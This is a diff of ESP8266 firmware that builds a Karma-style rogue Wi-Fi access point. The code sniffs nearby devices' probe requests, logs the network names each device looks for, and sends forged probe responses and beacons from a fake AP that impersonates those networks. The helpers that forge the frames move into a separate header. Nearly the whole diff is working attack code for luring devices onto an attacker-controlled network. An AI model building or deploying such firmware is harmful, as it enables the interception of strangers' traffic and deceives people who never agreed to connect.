@@ -5,11 +5,13 @@
 #include "mem.h"
 #include "user_interface.h"
 #include "driver/uart.h"
+#include "packetforge.h"
 
 #define user_procTaskPrio        0
 #define user_procTaskQueueLen    1
 os_event_t    user_procTaskQueue[user_procTaskQueueLen];
 
+#define CONFIG_DOGMA 1
 #define CHANNEL_HOP_INTERVAL 2500
 uint8_t channel = 7;
 uint16_t seq_n = 0;
@@ -26,7 +28,6 @@ static volatile os_timer_t chanhop_timer;
 // we "win" when we're able to try to connect
 // to forge_ap.
 uint8_t forge_ap[6] = {0x11,0x22,0x33,0x44,0x55,0x66};
-uint8_t forge_timestamp[8] = {0x0,0x0,0x0,0x0,0x0,0x0,0x0,0x0};
 
 /* ==============================================
  * Promiscous callback structures, see ESP manual
@@ -79,121 +80,6 @@ struct sniffer_buf2{
     uint16_t len;
 };
 
-int tag_supportedSSID(uint8_t *buf,int posn,uint8_t *orig_ssid,int orig_ssidlen)
-{
-  uint8_t *internal_buf = buf + posn;
-  int i = 0;
-  int l = 0;
-  internal_buf[++l] = 0x00;
-  internal_buf[++l] = orig_ssidlen;
-  for(i = 0;i < orig_ssidlen;i++)
-  {
-    internal_buf[++l] = orig_ssid[i];
-  }
-  return l;
-}
-
-// this should only be used with pkt_buf from proberesp
-// don't be a shitlord with this.
-void convert_probe_to_beacon(uint8_t *buf)
-{
-  int i = 0;
-  buf[0] = 0x80;
-  for (i=0; i<6; i++) buf[i+4] = 0xFF;
-}
-
-int tag_supportedRates(uint8_t *buf,int posn)
-{
-  uint8_t *internal_buf = buf + posn;
-  int l = 0;
-  internal_buf[++l] = 0x01;
-  internal_buf[++l] = 0x08;
-  internal_buf[++l] = 0x02;
-  internal_buf[++l] = 0x04;
-  internal_buf[++l] = 0x0b;
-  internal_buf[++l] = 0x16;
-  internal_buf[++l] = 0x24;
-  internal_buf[++l] = 0x30;
-  internal_buf[++l] = 0x48;
-  internal_buf[++l] = 0x6c;
-  return l;
-}
-
-int tag_supportedChannels(uint8_t *buf,int posn)
-{
-  uint8_t *internal_buf = buf + posn;
-  int l = 0;
-  internal_buf[++l] = 0x03;
-  internal_buf[++l] = 0x01;
-  internal_buf[++l] = 0x07;
-  return l;
-}
-
-int tag_ERPInformation(uint8_t *buf,int posn)
-{
-  /*
-    from wireshark. not too sure why this is
-    sent twice?
-  */
-  uint8_t *internal_buf = buf + posn;
-  int l = 0;
-  internal_buf[++l] = 0x2a; // type 1 erp information
-  internal_buf[++l] = 0x01;
-  internal_buf[++l] = 0x04; // barker preamble mode
-  internal_buf[++l] = 0x2f; // type 2 erp information
-  internal_buf[++l] = 0x01; 
-  internal_buf[++l] = 0x04; // barker preamble mode
-  return l;
-}
-
-int tag_extendedSupportedRates(uint8_t *buf, int posn)
-{
-  uint8_t *internal_buf = buf + posn;
-  int l = 0;
-  internal_buf[++l] = 0x32; 
-  internal_buf[++l] = 0x08; 
-  internal_buf[++l] = 0x0c; // 6
-  internal_buf[++l] = 0x12; // 9
-  internal_buf[++l] = 0x18; // 12
-  internal_buf[++l] = 0x24;
-  internal_buf[++l] = 0x30;
-  internal_buf[++l] = 0x48;
-  internal_buf[++l] = 0x60; 
-  internal_buf[++l] = 0x6c;
-  return l;  
-}
-
-// we have to reply to each tag the parent expects
-uint16_t proberesp(uint8_t *buf, uint8_t *client, uint8_t *ap, uint16_t seq,uint8_t ssid_len, char *ssid)
-{
-    int i=0;
-
-    buf[0] = 0x50; // probe_response
-    buf[1] = 0x00;
-    // duration - doesn't matter.
-    buf[2] = 0x00;
-    buf[3] = 0x00;
-    // client AP.
-    for (i=0; i<6; i++) buf[i+4] = client[i];
-    // Sender
-    for (i=0; i<6; i++) buf[i+10] = ap[i];
-    for (i=0; i<6; i++) buf[i+16] = ap[i];
-    // Seq_n
-    buf[22] = seq % 0x100; // bug in original karma source
-    buf[23] = seq / 0x100;
-    for(i = 0;i < 8;i++) buf[i+24] = forge_timestamp[i]; // fuck the timestamp
-    buf[32] = 0x64; // beacon interval - copied from wireshark
-    buf[33] = 0x00;
-    buf[34] = 0x01; // wifi capabilities
-    buf[35] = 0x00;
-    int newPosn = 35 + tag_supportedSSID(buf,35,ssid,ssid_len);
-    newPosn += tag_supportedRates(buf,newPosn);
-    newPosn += tag_supportedChannels(buf,newPosn);
-    newPosn += tag_ERPInformation(buf,newPosn);
-    newPosn += tag_extendedSupportedRates(buf,newPosn);
-    return newPosn + 1;
-}
-
 /* Listens communication between AP and client */
 static void ICACHE_FLASH_ATTR
 promisc_cb(uint8_t *buf, uint16_t len)
@@ -204,6 +90,10 @@ promisc_cb(uint8_t *buf, uint16_t len)
         struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
     } 
     else {
+        if(len > 300)
+        {
+          os_printf(">300 data packet\n");
+        }
         struct sniffer_buf2 *sniffer = (struct sniffer_buf2*) buf;
         unsigned int frameControl = ((unsigned int)sniffer->buf[1] << 8) + sniffer->buf[0];
         unsigned int version      = (frameControl & 0b0000000000000011) >> 0;
@@ -220,14 +110,19 @@ promisc_cb(uint8_t *buf, uint16_t len)
         }
 	      else if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_REQUEST)
 	      {
+          // todo: robustness.
           if(sniffer->buf[0x19] == 0)
           {
             i = 6;
-            // os_printf("BROADCAST PROBE from %02x:%02x:%02x:%02x:%02x:%02x\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9]);
+            os_printf("BROADCAST PROBE from %02x:%02x:%02x:%02x:%02x:%02x\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9]);
+            uint16_t seqnPacket = (((unsigned int)sniffer->buf[23] << 8) + sniffer->buf[22] ) >> 4;
+            uint16_t newSeqnPacket = ((seqnPacket + 1) << 4) & 0xFFF0;
+            beaconPNL(sniffer->buf + 10,newSeqnPacket);
           }
           else{
-            char pkt_buf[512];
-            char ssid[128];
+            char *pkt_buf = (char *)os_malloc(256);
+	          char *beacon_buf = (char *)os_malloc(256);
+            char *ssid = (char *)os_malloc(128);
             uint8_t ssidLength = sniffer->buf[i+0x19];
             int x = 0;
             for(x = 0;x < sniffer->buf[i+0x19];x++)
@@ -235,17 +130,30 @@ promisc_cb(uint8_t *buf, uint16_t len)
               ssid[x] = sniffer->buf[i+0x1a+x];
             }
             i = 6;
-            // os_printf("FREEHEAP:%x\n",system_get_free_heap_size());
             uint16_t seqnPacket = (((unsigned int)sniffer->buf[23] << 8) + sniffer->buf[22] ) >> 4;
-            uint16_t newSeqnPacket = ((seqnPacket + 0x10) << 4) & 0xFFF0;
-            os_printf("ORIGINAL: %02x%02x XLAT: %d FORGED: %04x\n",sniffer->buf[22],sniffer->buf[23],seqnPacket,newSeqnPacket);
-            uint16_t size = proberesp(pkt_buf,(sniffer->buf + 10),forge_ap,newSeqnPacket,ssidLength,ssid);
-            // avoids off-by-one in ssid name in proberesp.
+            uint16_t newSeqnPacket = ((seqnPacket + 1) << 4) & 0xFFF0;
+            uint16_t probeRespSize = proberesp(pkt_buf,(sniffer->buf + 10),forge_ap,newSeqnPacket,ssidLength,ssid);
+            uint16_t beaconRespSize = beaconresp(beacon_buf,(sniffer->buf + 10),forge_ap,newSeqnPacket,ssidLength,ssid);
             ssid[x] = 0;
+            storePNL(sniffer->buf + 10,ssid,ssidLength);
             os_printf("DIRECTED PROBE REQUEST from %02x:%02x:%02x:%02x:%02x:%02x (SSID:%s) (SEQN:%d)\n",sniffer->buf[i+4],sniffer->buf[i+5],sniffer->buf[i+6],sniffer->buf[i+7],sniffer->buf[i+8],sniffer->buf[i+9],ssid,seqnPacket);
-            wifi_send_pkt_freedom(pkt_buf,size,0);
-            convert_probe_to_beacon(pkt_buf);
-            wifi_send_pkt_freedom(pkt_buf,size,0);
+            int repeatSend = 0;
+            if(CONFIG_DOGMA == 1)
+            {
+              int retval = wifi_send_pkt_freedom(beacon_buf,beaconRespSize,0);
+              if (retval != 0)
+              {
+                os_printf("beacon fail\n");
+              }
+            }
+            int retval = wifi_send_pkt_freedom(pkt_buf,probeRespSize,0);
+            if (retval != 0)
+            {
+              os_printf("probe response fail\n");
+            }
+            os_free(pkt_buf);
+            os_free(ssid);
+            os_free(beacon_buf);
           }
         }
         else if(frameType == TYPE_MANAGEMENT && frameSubType == SUBTYPE_PROBE_RESPONSE)
@@ -254,7 +162,8 @@ promisc_cb(uint8_t *buf, uint16_t len)
           {
             // lol
             i = 0;
-            for(i = 0;i < 8;i++) forge_timestamp[i] = sniffer->buf[24+i];
+            saveForgedTimestamp(sniffer->buf + 24);
+            // for(i = 0;i < 8;i++) forge_timestamp[i] = sniffer->buf[24+i];
           }
         }
     }
@@ -272,18 +181,23 @@ sniffer_system_init_done(void)
 
 void channelhop(void *arg)
 {
-    // channel = 1 + (channel + 1) % 12; // no such thing as chan0
-    channel = 1 + (channel++ % 12);
+    channel = 1 + ((channel + 2) % 12);
     os_printf("Hopping to channel %d\n", channel);
     wifi_set_channel(channel);
+    wifi_promiscuous_enable(0);
+    wifi_set_promiscuous_rx_cb(promisc_cb);
+    wifi_promiscuous_enable(1);
 }
 
 void ICACHE_FLASH_ATTR
 user_init()
 {
     uart_init(115200, 115200);
+    os_printf("\n\n*** TO ASHES ***\n\n");
 
+    initPNL();
     wifi_set_opmode(STATION_MODE);
+    // uncomment to channel hop
     os_timer_disarm(&chanhop_timer);
     os_timer_setfn(&chanhop_timer, (os_timer_func_t *) channelhop, NULL);
     os_timer_arm(&chanhop_timer, CHANNEL_HOP_INTERVAL, 1);
